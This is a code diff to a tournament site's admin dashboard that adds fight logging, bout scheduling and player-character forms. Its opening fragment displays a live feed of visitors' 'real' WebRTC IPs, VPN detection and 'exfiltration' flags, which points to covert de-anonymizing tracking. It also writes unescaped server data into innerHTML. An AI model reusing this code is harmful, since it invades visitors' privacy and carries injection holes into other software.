+    const entryTime = new Date(entry.timestamp);
+    const hoursDiff = (now - entryTime) / (1000 * 60 * 60);
+    return hoursDiff <= 24 && entry.ip_real_webrtc && entry.ip_real_webrtc !== 'unknown';
+  });
+
+  // Get latest entries (last 10 válidas)
+  const latest = validData.slice(-10).reverse();
+  const entries = latest.map(entry => {
+    const ts = new Date(entry.timestamp).toLocaleTimeString('es-ES');
+    const ip = entry.ip_real_webrtc || 'unknown';
+    const threat = entry.vpn_detectada || (entry.spamhaus_status && entry.spamhaus_status !== 'clean') ? 'danger' : 'safe';
+    const action = entry.exfiltration_detected ? 'EXFILTRACIÓN DETECTADA' : 'Acceso normal';
+    const vulnCount = entry.vulnerabilities ? entry.vulnerabilities.length : 0;
+    const vulnInfo = vulnCount > 0 ? ` | ${vulnCount} vulnerabilidades encontradas` : '';
+    return `<div class="live-entry ${threat}">
+      <strong>${ts}</strong> | ${ip} | ${action}${vulnInfo}
+    </div>`;
+  }).join('');
+
+  feed.innerHTML = entries || '<div class="no-data">Esperando datos en vivo...</div>';
+}
+
+// ───────────────────────────────────────────────────────────────
+// COMBATES — registrar + listar
+// ───────────────────────────────────────────────────────────────
+(function initCombateDate() {
+  const d = document.getElementById('cf-date');
+  if (d) d.value = new Date().toISOString().split('T')[0];
+})();
+
+async function loadPlayerDropdowns() {
+  try {
+    const res = await fetch(window.location.origin + '/api/competidores');
+    if (!res.ok) return;
+    const players = await res.json();
+    const opts = players
+      .sort((a,b) => a.pseudonimo.localeCompare(b.pseudonimo))
+      .map(p => `<option value="${p.pseudonimo}">${p.pseudonimo} (${p.division || p.division_name || '—'})</option>`)
+      .join('');
+    // Combates
+    ['cf-p1','cf-p2'].forEach(id => {
+      const sel = document.getElementById(id);
+      if (sel) sel.innerHTML = '<option value="">— Selecciona jugador —</option>' + opts;
+    });
+    // Personajes
+    const pcSel = document.getElementById('pc-player');
+    if (pcSel) pcSel.innerHTML = '<option value="">— Selecciona jugador —</option>' + opts;
+    // Próximas peleas
+    ['pp-p1','pp-p2'].forEach(id => {
+      const sel = document.getElementById(id);
+      if (sel) sel.innerHTML = '<option value="">— Selecciona jugador —</option>' + opts;
+    });
+  } catch(e) { /* silent */ }
+}
+
+// ───────────────────────────────────────────────────────────────
+// TOP PERSONAJES
+// ───────────────────────────────────────────────────────────────
+async function guardarPersonajes() {
+  const pseudo = document.getElementById('pc-player').value;
+  const char1  = document.getElementById('pc-char1').value.trim();
+  const char2  = document.getElementById('pc-char2').value.trim();
+  const char3  = document.getElementById('pc-char3').value.trim();
+  const msg    = document.getElementById('pc-msg');
+
+  if (!pseudo) { msg.textContent = '⚠ Selecciona un jugador'; msg.style.color = '#f87171'; return; }
+  msg.textContent = 'Guardando...'; msg.style.color = 'rgba(255,255,255,.45)';
+  try {
+    const res = await fetch(window.location.origin + '/api/admin/jugador/personajes', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + jwtToken },
+      body: JSON.stringify({ pseudo, char1, char2, char3 })
+    });
+    if (res.ok) {
+      msg.textContent = `✓ Personajes de ${pseudo} actualizados`; msg.style.color = '#4ade80';
+      ['pc-char1','pc-char2','pc-char3'].forEach(id => { const el = document.getElementById(id); if(el) el.value=''; });
+    } else {
+      const err = await res.json().catch(()=>({}));
+      msg.textContent = '✗ ' + (err.error || res.status); msg.style.color = '#f87171';
+    }
+  } catch(e) { msg.textContent = '✗ Error de red'; msg.style.color = '#f87171'; }
+}
+
+// ───────────────────────────────────────────────────────────────
+// PRÓXIMAS PELEAS
+// ───────────────────────────────────────────────────────────────
+(function initPPDate() {
+  const d = document.getElementById('pp-date');
+  if (d) d.value = new Date().toISOString().split('T')[0];
+})();
+
+async function programarPelea() {
+  const p1    = document.getElementById('pp-p1').value;
+  const p2    = document.getElementById('pp-p2').value;
+  const date  = document.getElementById('pp-date').value;
+  const event = document.getElementById('pp-event').value.trim() || 'Bellator RolBattle';
+  const div   = document.getElementById('pp-div').value.trim();
+  const notes = document.getElementById('pp-notes').value.trim();
+  const msg   = document.getElementById('pp-msg');
+
+  if (!p1 || !p2) { msg.textContent = '⚠ Selecciona ambos jugadores'; msg.style.color = '#f87171'; return; }
+  if (p1 === p2)  { msg.textContent = '⚠ No pueden ser el mismo jugador'; msg.style.color = '#f87171'; return; }
+  if (!date)      { msg.textContent = '⚠ Ingresa la fecha'; msg.style.color = '#f87171'; return; }
+
+  msg.textContent = 'Guardando...'; msg.style.color = 'rgba(255,255,255,.45)';
+  try {
+    const res = await fetch(window.location.origin + '/api/admin/proxima-pelea', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + jwtToken },
+      body: JSON.stringify({ player1_pseudo: p1, player2_pseudo: p2, event_date: date, event_name: event, division: div, notes })
+    });
+    if (res.ok) {
+      msg.textContent = `✓ ${p1} vs ${p2} programado para ${date}`; msg.style.color = '#4ade80';
+      ['pp-event','pp-div','pp-notes'].forEach(id => { const el = document.getElementById(id); if(el) el.value=''; });
+      loadProximasPeleas();
+    } else {
+      const err = await res.json().catch(()=>({}));
+      msg.textContent = '✗ ' + (err.error || res.status); msg.style.color = '#f87171';
+    }
+  } catch(e) { msg.textContent = '✗ Error de red'; msg.style.color = '#f87171'; }
+}
+
+async function eliminarProximaPelea(id) {
+  if (!confirm('¿Eliminar esta pelea programada?')) return;
+  try {
+    const res = await fetch(window.location.origin + '/api/admin/proxima-pelea/' + id, {
+      method: 'DELETE',
+      headers: { 'Authorization': 'Bearer ' + jwtToken }
+    });
+    if (res.ok) loadProximasPeleas();
+    else alert('Error al eliminar');
+  } catch(e) { alert('Error de red'); }
+}
+
+async function loadProximasPeleas() {
+  const container = document.getElementById('pp-list');
+  if (!container) return;
+  try {
+    const res = await fetch(window.location.origin + '/api/proximas-peleas');
+    if (!res.ok) { container.innerHTML = '<div style="color:#f87171;font-size:.82rem">Error</div>'; return; }
+    const peleas = await res.json();
+    if (!peleas || peleas.length === 0) {
+      container.innerHTML = '<div style="color:rgba(255,255,255,.3);font-size:.82rem">No hay peleas programadas aún.</div>';
+      return;
+    }
+    container.innerHTML = `
+      <table style="width:100%;border-collapse:collapse;font-size:.82rem">
+        <thead>
+          <tr style="color:var(--muted);text-transform:uppercase;font-size:10px;letter-spacing:.05em;border-bottom:1px solid rgba(255,255,255,.08)">
+            <th style="padding:6px 8px;text-align:left">Fecha</th>
+            <th style="padding:6px 8px;text-align:left">Evento</th>
+            <th style="padding:6px 8px;text-align:left">Jugador 1</th>
+            <th style="padding:6px 8px;text-align:left">Jugador 2</th>
+            <th style="padding:6px 8px;text-align:left">División</th>
+            <th style="padding:6px 4px"></th>
+          </tr>
+        </thead>
+        <tbody>
+          ${peleas.map(p => `
+            <tr style="border-bottom:1px solid rgba(255,255,255,.04)">
+              <td style="padding:7px 8px;color:rgba(255,255,255,.55)">${p.event_date || '—'}</td>
+              <td style="padding:7px 8px;color:rgba(255,255,255,.7)">${p.event_name || '—'}</td>
+              <td style="padding:7px 8px;font-weight:600">${p.player1_pseudo}</td>
+              <td style="padding:7px 8px;font-weight:600">${p.player2_pseudo}</td>
+              <td style="padding:7px 8px;color:rgba(255,255,255,.45)">${p.division || '—'}</td>
+              <td style="padding:7px 4px">
+                <button onclick="eliminarProximaPelea('${p.id}')" title="Eliminar" style="background:none;border:none;cursor:pointer;color:#f87171;font-size:.9rem;opacity:.6" onmouseover="this.style.opacity=1" onmouseout="this.style.opacity=.6">✕</button>
+              </td>
+            </tr>
+          `).join('')}
+        </tbody>
+      </table>`;
+  } catch(e) {
+    container.innerHTML = '<div style="color:rgba(255,255,255,.25);font-size:.82rem">—</div>';
+  }
+}
+
+async function registrarCombate() {
+  const p1      = document.getElementById('cf-p1').value.trim();
+  const p2      = document.getElementById('cf-p2').value.trim();
+  const result  = document.getElementById('cf-result').value;
+  const date    = document.getElementById('cf-date').value;
+  const event   = document.getElementById('cf-event').value.trim() || 'Torneo Bellator 2026';
+  const div     = document.getElementById('cf-division').value.trim();
+  const char1   = document.getElementById('cf-char1').value.trim();
+  const char2   = document.getElementById('cf-char2').value.trim();
+  const notes   = document.getElementById('cf-notes').value.trim();
+  const msg     = document.getElementById('cf-msg');
+
+  if (!p1 || !p2) { msg.textContent = '⚠ Selecciona ambos jugadores'; msg.style.color = '#f87171'; return; }
+  if (p1.toLowerCase() === p2.toLowerCase()) { msg.textContent = '⚠ No pueden ser el mismo jugador'; msg.style.color = '#f87171'; return; }
+
+  // Mostrar nombre del ganador en el mensaje
+  const resultLabel = result === 'player1' ? `🏆 Gana ${p1}` : result === 'player2' ? `🏆 Gana ${p2}` : '🤝 Empate';
+  msg.textContent = 'Guardando...'; msg.style.color = 'rgba(255,255,255,.45)';
+  try {
+    const res = await fetch(window.location.origin + '/api/admin/combate', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + jwtToken },
+      body: JSON.stringify({ player1_pseudo: p1, player2_pseudo: p2, result, event_date: date, event_name: event, division: div, player1_char: char1, player2_char: char2, notes })
+    });
+    if (res.ok) {
+      const data = await res.json().catch(() => ({}));
+      const warn = (data.p1_warn || data.p2_warn) ? ' ⚠ stats parciales' : '';
+      msg.textContent = `✓ ${resultLabel} — récord actualizado${warn}`; msg.style.color = '#4ade80';
+      ['cf-char1','cf-char2','cf-notes','cf-event','cf-division'].forEach(id => {
+        const el = document.getElementById(id); if (el) el.value = '';
+      });
+      loadRecentCombates();
+    } else {
+      const err = await res.json().catch(() => ({}));
+      msg.textContent = '✗ ' + (err.error || res.status); msg.style.color = '#f87171';
+    }
+  } catch(e) {
+    msg.textContent = '✗ Error de red'; msg.style.color = '#f87171';
+  }
+}
+
+async function eliminarCombate(id) {
+  if (!confirm('¿Eliminar este combate? El récord W/L/D NO se revierte automáticamente.')) return;
+  try {
+    const res = await fetch(window.location.origin + '/api/admin/combate/' + id, {
+      method: 'DELETE',
+      headers: { 'Authorization': 'Bearer ' + jwtToken }
+    });
+    if (res.ok) loadRecentCombates();
+    else alert('Error al eliminar');
+  } catch(e) { alert('Error de red'); }
+}
+
+async function loadRecentCombates() {
+  const container = document.getElementById('cf-recent');
+  if (!container) return;
+  try {
+    const res = await fetch(window.location.origin + '/api/admin/combates-recientes', {
+      headers: { 'Authorization': 'Bearer ' + jwtToken }
+    });
+    if (!res.ok) { container.innerHTML = '<div style="color:#f87171;font-size:.82rem">Error cargando historial</div>'; return; }
+    const combates = await res.json();
+    if (!combates || combates.length === 0) {
+      container.innerHTML = '<div style="color:rgba(255,255,255,.3);font-size:.82rem">No hay combates registrados aún.</div>';
+      return;
+    }
+    const resultLabel = r => r === 'player1' ? '<span style="color:#4ade80;font-weight:700">P1 GANA</span>'
+                           : r === 'player2' ? '<span style="color:#60a5fa;font-weight:700">P2 GANA</span>'
+                           : '<span style="color:#fbbf24;font-weight:700">EMPATE</span>';
+    container.innerHTML = `
+      <table style="width:100%;border-collapse:collapse;font-size:.82rem">
+        <thead>
+          <tr style="color:var(--muted);text-transform:uppercase;font-size:10px;letter-spacing:.05em;border-bottom:1px solid rgba(255,255,255,.08)">
+            <th style="padding:6px 8px;text-align:left">Fecha</th>
+            <th style="padding:6px 8px;text-align:left">Evento</th>
+            <th style="padding:6px 8px;text-align:left">Jugador 1</th>
+            <th style="padding:6px 8px;text-align:left">Jugador 2</th>
+            <th style="padding:6px 8px;text-align:left">Resultado</th>
+            <th style="padding:6px 8px;text-align:left">División</th>
+            <th style="padding:6px 4px"></th>
+          </tr>
+        </thead>
+        <tbody>
+          ${combates.map(c => `
+            <tr style="border-bottom:1px solid rgba(255,255,255,.04)">
+              <td style="padding:7px 8px;color:rgba(255,255,255,.55)">${c.event_date || '—'}</td>
+              <td style="padding:7px 8px;color:rgba(255,255,255,.7)">${c.event_name || '—'}</td>
+              <td style="padding:7px 8px;font-weight:600">${c.player1_pseudo}</td>
+              <td style="padding:7px 8px;font-weight:600">${c.player2_pseudo}</td>
+              <td style="padding:7px 8px">${resultLabel(c.result)}</td>
+              <td style="padding:7px 8px;color:rgba(255,255,255,.45)">${c.division || '—'}</td>
+              <td style="padding:7px 4px">
+                <button onclick="eliminarCombate('${c.id}')" title="Eliminar" style="background:none;border:none;cursor:pointer;color:#f87171;font-size:.9rem;opacity:.6" onmouseover="this.style.opacity=1" onmouseout="this.style.opacity=.6">✕</button>
+              </td>
+            </tr>
+          `).join('')}
+        </tbody>
+      </table>`;
+  } catch(e) {
+    container.innerHTML = '<div style="color:rgba(255,255,255,.25);font-size:.82rem">—</div>';
+  }
+}
+
+// ───────────────────────────────────────────────────────────────
 // INIT
 // ───────────────────────────────────────────────────────────────
 (function init() {
-  if (jwtToken) showDashboard();
+  if (jwtToken) { showDashboard(); loadRecentCombates(); loadPlayerDropdowns(); loadProximasPeleas(); }
 })();
 </script>
+<script src="/translate.js?v=4"></script>
 </body>
 </html>
